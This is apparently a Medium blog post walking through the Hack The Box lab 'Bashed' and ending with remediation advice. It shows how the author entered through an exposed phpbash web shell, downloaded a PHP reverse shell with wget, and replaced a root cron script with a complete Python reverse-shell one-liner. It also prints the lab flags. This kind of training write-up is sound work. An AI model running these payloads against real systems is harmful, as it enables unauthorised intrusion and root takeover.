# 🕵️‍♂️ Hacking Bashed: The Deadly Cost of "Shadow IT" Exposed 💀

Security by obscurity fails again.🔥 Learn how I hijacked a server using the developer's own forgotten tools. Don't miss this! 👇

---

### 📜 Bashed: Web Shell Exploitation & Privilege Escalation

![](https://cdn-images-1.medium.com/max/800/1*KbkaSn2ZsKOUKe6enNoPig.png)
<figcaption>Image created by Nicholas Mullenski (Gemini)</figcaption>

> <a href="https://medium.com/meetcyber/%EF%B8%8F-%EF%B8%8F-hacking-bashed-the-deadly-cost-of-shadow-it-exposed-dc0ecda2c4ba?sk=e1a469aa3a7a038478a77198f78f6f00" class="markup--anchor markup--pullquote-anchor" data-href="https://medium.com/meetcyber/%EF%B8%8F-%EF%B8%8F-hacking-bashed-the-deadly-cost-of-shadow-it-exposed-dc0ecda2c4ba?sk=e1a469aa3a7a038478a77198f78f6f00" target="_blank">**Not a member?? Click Here to read Full-Story**</a>

**Target:** *Bashed (Hack The Box)* **OS:** *Linux* **Difficulty:** *Easy* **Attack Vectors:** *Exposed Web Shell (phpbash) -\> Sudo Misconfiguration -\> Insecure Automation.*

### Executive Summary

This assessment targeted “Bashed,” a Linux server hosting a blog about pentesting tools. The initial foothold was achieved not through a complex exploit, but by discovering a publicly accessible web shell (**phpbash**) left behind by the developer. This granted immediate code execution as **`www-data`**.

Root compromise was achieved by enumerating local users and identifying a privilege escalation vector involving the **`scriptmanager`** user. By manipulating a Python script executed automatically by a system process ***(cron/sudo)***, we injected a malicious payload to elevate privileges from a restricted user to **Root**.

---

### 1.0 Initial Foothold

#### 1.1 Reconnaissance & Enumeration

**1.1.1 Nmap Scan**

- <span id="61fd">We began the assessment with a comprehensive Nmap scan to identify open ports and services on **`10.10.10.68`**.</span>

```
 nmap -sC -sV -A -vvv  10.10.10.68 -Pn

PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16

```

**1.1.2 Nmap Scan Analysis** The scan revealed a single entry point: **Port 80 (HTTP)** running **Apache 2.4.18**.

- <span id="37f4">**Operating System:** The TCP fingerprint confirms the target is running Linux (Kernel 3.x — 4.x), likely Ubuntu based on the Apache version string.</span>
- <span id="9328">**Web Title:** The site title “Arrexel’s Development Site” is a significant clue. Development sites often contain unfinished code, debug tools, or backup files that should not be public.</span>
- <span id="97b9">**Attack Vector:** With no other services (like SSH or SMB) exposed, our entire attack surface is the web application. We must focus on directory enumeration and inspecting the site for developer oversight.</span>

**1.1.3 Key Findings**

- <span id="1682">**Port 80:** Apache httpd 2.4.18.</span>
- <span id="65c9">**OS:** Ubuntu Linux.</span>
- <span id="c2bf">**Context:** A “Development Site” implies potential security lapses (forgotten tools, weak permissions).</span>

#### 1.2 Web Directory Enumeration

**1.2.1** With a web server identified, we need to map out the application structure. Developers often rely on “Security through Obscurity,” hoping that if they don’t link to a directory (like **`/admin`** or **`/dev`**), no one will find it. As penetration testers, we use tools to challenge that assumption.

**1.2.2 Execution & Findings**

- <span id="96eb">I attempted to map the directories using **Gobuster**, but the target server was unstable and repeatedly timed out.</span>
- <span id="54e2">Instead of waiting on a failing tool, I manually verified common directories based on the “Development Site” context. I successfully identified the **`/dev`** directory using **`curl`**.</span>

**Command:**

```
curl -I http://10.10.10.68/dev/
```

Output:

```
HTTP/1.1 200 OK
Date: Wed, 31 Dec 2025 22:08:02 GMT
Server: Apache/2.4.18 (Ubuntu)
```

The existence of **`/dev`** **on** a production server is the critical finding here.

#### 1.3 Inspecting the `/dev` Directory

**1.3.1 Navigating** to **`http://10.10.10.68/dev/`** in the browser revealed two scripts: **`phpbash.php`** and **`phpbash.min.php`**.

**Analysis:** These are instances of **phpbash**, a web shell that provides a terminal interface in the browser.

**Vulnerability:** Clicking **`phpbash.php`** grants unauthenticated access to the system as the user **`www-data`**.

### 2.0 Exploitation

#### 2.1 Establishing a Reverse Shell

**2.1.1** While the web shell provided basic command execution, it lacked the stability and features of a full terminal (interactive applications, job control). To rectify this, I established a reverse shell back to my attack machine.

**2.1.2 Methodology:** Attempting standard Bash one-liners directly in the web shell failed due to character escaping issues. I opted for a more reliable method: uploading a PHP reverse shell payload.

1.  <span id="0e62">**Payload Preparation:** I configured the PentestMonkey `p`**`hp-reverse-shell.php`** with my attacker IP (**`10.10.14.32`**) and port (**`4444`**).</span>
2.  <span id="9f3f">**Delivery:** I hosted the file on my attack machine using a Python HTTP server and downloaded it to the target using **`wget`**.</span>

```
wget http://10.10.14.32/shell.php -O /tmp/rev.php
```

**3. Execution:** I started a Netcat listener and executed the payload via the web shell:

```
php /tmp/rev.php
```

**Result:** A connection was received on the listener, granting shell access as **`www-data`**.

```
┌──(nicholas㉿Nicholas)-[~/HTB/Labs/Bashed]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.32] from (UNKNOWN) [10.10.10.68] 56568
Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 14:27:16 up  1:15,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@bashed:/$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(nicholas㉿Nicholas)-[~/HTB/Labs/Bashed]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444
                               export TERM=xterm

www-data@bashed:/$ cd home
www-data@bashed:/home$ ls -la
total 16
drwxr-xr-x  4 root          root          4096 Dec  4  2017 .
drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
drwxr-xr-x  4 arrexel       arrexel       4096 Jun  2  2022 arrexel
drwxr-xr-x  3 scriptmanager scriptmanager 4096 Dec  4  2017 scriptmanager

```

#### 2.2 Shell Stabilization

**2.2.1** To prevent the shell from hanging on interactive commands (like **`sudo`** or text editors), I upgraded the session to a fully interactive TTY.

- <span id="b421">**Command:** **`python -c 'import pty; pty.spawn("/bin/bash")'`**</span>
- <span id="3301">**Terminal Adjustment:** Used **`stty raw -echo; fg`** to pass keyboard shortcuts correctly.</span>

### 3.0 Post-Exploitation

#### 3.1 Local Enumeration & User Flag

**3.1.1** I navigated to the **`/home`** directory to identify valid users on the system.

**Users Identified:**

- <span id="8b7c">**`arrexel`** (Standard User)</span>
- <span id="ddba">**`scriptmanager`** (Potential Service Account)</span>

I checked the **`arrexel`** directory and found the user flag readable by **`www-data`**.

**User Flag:** **`cat /home/arrexel/user.txt`**

> ***Flag:*** ***`0c8563b88b67bdb4574b22c8476c2f81`***

### 4.0 Privilege Escalation: Lateral Movement

**4.1.1 Enumeration:** To identify potential escalation vectors, I checked the sudo privileges for the current user.

- <span id="30a5">**Command:** **`sudo -l`**</span>

**Findings:**

```
User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

**4.1.2 Analysis:** The configuration explicitly allows **`www-data`** to execute any command as the user **`scriptmanager`** without a password. This suggests that the web application (running as **`www-data`**) interacts with backend automation scripts owned by **`scriptmanager`**.

**4.1.3 Exploitation:** I pivoted to the **`scriptmanager`** user to investigate further.

- <span id="b79c">**Command:** **`sudo -u scriptmanager /bin/bash`**</span>

#### 4.2 Investigating the Shadow IT

**4.1.1 Objective:** Identify why the **`scriptmanager`** user exists and what resources it controls.

**4.1.2 Enumeration:** I listed the root directory to look for non-standard folders.

- <span id="224f">**Command:** **`ls -la /`**</span>
- <span id="ed37">**Finding:** A directory named **`/scripts`**, owned by **`scriptmanager`**, located at the filesystem root.</span>

**4.1.3 Analysis of** **`/scripts`:** Inside the directory, I found two files:

1.  <span id="ed20">**`test.py`** (Owned by **`scriptmanager`**)</span>
2.  <span id="659a">**`test.txt`** (Owned by **`root`**)</span>

**4.1.4 The file** **`test.txt`** contained text seemingly generated by **`test.py`**. Crucially, **`test.txt`** was owned by **root**, while the script generating it (**`test.py`**) was owned by **me** (**`scriptmanager`**).

**4.1.5 Conclusion:** This indicates that a system cron job (scheduled task) is executing **`test.py`** as the **Root** user at regular intervals (likely every minute). Because I have write access to **`test.py`**, I can modify the code. When the cron job triggers again, it will execute *my* code with Root privileges.

#### 5.0 Root Escalation

**5.1.1 The Exploit:** I crafted a Python reverse shell payload to replace the contents of **`test.py`**.

**5.1.2: Step 1: Preparation** I started a Netcat listener on my attack machine:

```
nc -lvnp 5555
```

**5.1.3: Step 2: Injection** I navigated to the directory and overwrote the script using **`echo`**.

- <span id="4dfa">**Command:**</span>

```
scriptmanager@bashed:/home$ cd /scripts
scriptmanager@bashed:/scripts$ echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.32',5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" > test.py
```

**5.1.4: Step 3: Capture** I waited approximately 60 seconds for the system cron job to trigger. The connection was established on my listener, granting me a root shell.

**Root Flag:**

```
┌──(nicholas㉿Nicholas)-[~/HTB/Labs/Bashed]
└─$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.10.14.32] from (UNKNOWN) [10.10.10.68] 45818
/bin/sh: 0: can't access tty; job control turned off
# cat /root/root.txt
ed638a3c3b433e84ebd971ea6d2c8887
```

![](https://cdn-images-1.medium.com/max/800/1*XWuBvC0UyEv6zNTRyK-_gw.png)
<figcaption>Image created by Nicholas Mullenski (Gemini)</figcaption>

### 5.0 Conclusion

The compromise of “Bashed” serves as a textbook example of how operational negligence can be just as dangerous as software vulnerabilities. We did not need to exploit a complex buffer overflow or crack a difficult password. The path to Root was paved by the developer’s own tools.

The initial foothold was achieved simply because a convenient administrative tool (**`phpbash`**) was left accessible to the public internet. From there, privilege escalation was trivialized by a misconfigured sudo permission and a maintenance script that was writable by a low-privileged user but executed by Root. The system was wide open not because of what it *was*, but because of what was *left behind*.

### 6.0 Red Team Mandate

As a Red Teamer, my job is to demonstrate the impact of these misconfigurations before an adversary does. The following remediation steps are critical to securing this environment:

### Remediation Strategy

1.  <span id="00eb">**Immediate Removal of Shadow IT:** The **`phpbash.php`** web shell must be deleted immediately. If remote administration is required, use secure, authenticated protocols like SSH with key-based authentication, not unauthenticated web scripts.</span>
2.  <span id="f662">**Principle of Least Privilege (sudo):** Review the **`/etc/sudoers`** file. The **`www-data`** user should not have password-less access to switch to the **`scriptmanager`** account.</span>
3.  <span id="e58b">**Secure File Permissions:** The **`/scripts`** directory and its contents utilize unsafe permissions. A script executed by Root should **never** be writable by a standard user. Change the ownership of **`test.py`** to **`root:root`** and set permissions to **`700`** (read/write/execute for owner only).</span>
4.  <span id="b6fa">**Cron Job Hygiene:** Audit all system cron jobs. Ensure that scripts triggered by system-wide crontabs are stored in protected directories (like **`/usr/local/sbin`**) rather than user-accessible folders.</span>

### 7.0 The Biblical Tie-In

The vulnerability in this lab wasn’t technical complexity; it was laziness. The developer built a useful tool but failed to clean it up. They left a door open that should have been shut.

> ***“One who is slack in his work is brother to one who destroys.” — Proverbs 18:9 (NIV)***

**Application:** In the physical world, being “slack” or lazy might just result in a messy desk. In the digital world, being slack creates a direct path for destruction. The developer didn’t *intend* to harm the server, but by failing to remove the temporary web shell and secure the python script, they became a “brother to one who destroys.”

This lab reminds us that **stewardship is security**. God calls us to be diligent in our work. Leaving a job half-finished — like leaving a debug tool on a production server — isn’t just unprofessional; it’s a failure of the responsibility we’ve been given to protect the “house.”

### 🚀 Join the Mission

I don’t want to do this alone. I want to build a community of people who are hungry to learn, build, and break things (ethically). I am constantly looking for the next challenge.

- <span id="7935">Is there a specific tool you wish existed?</span>
- <span id="47ec">Is there a hacking concept you want me to learn and explain?</span>
- <span id="195d">Do you have a “brick wall” you’re hitting in your own research?</span>

Jump into the server, drop a message, and tell me what I should build or learn next. Let’s sharpen each other.

<a href="https://discord.gg/8buAHtm2fK" class="markup--anchor markup--mixtapeEmbed-anchor" data-href="https://discord.gg/8buAHtm2fK" title="https://discord.gg/8buAHtm2fK"><strong>Join the Iron-Breach Discord Server!</strong><br />
<em>An advanced study group for Offensive Security professionals and students. We specialize in Red Teaming simulation…</em>discord.gg</a><a href="https://discord.gg/8buAHtm2fK" class="js-mixtapeImage mixtapeImage mixtapeImage--empty u-ignoreBlock" data-media-id="9784a322b4c4322c092dbd39583df8bb"></a>

By <a href="https://medium.com/@nicholasmullenski" class="p-author h-card">Nicholas Mullenski</a> on [December 31, 2025](https://medium.com/p/dc0ecda2c4ba).

<a href="https://medium.com/@nicholasmullenski/%EF%B8%8F-%EF%B8%8F-hacking-bashed-the-deadly-cost-of-shadow-it-exposed-dc0ecda2c4ba" class="p-canonical">Canonical link</a>

Exported from [Medium](https://medium.com) on September 1, 2026.
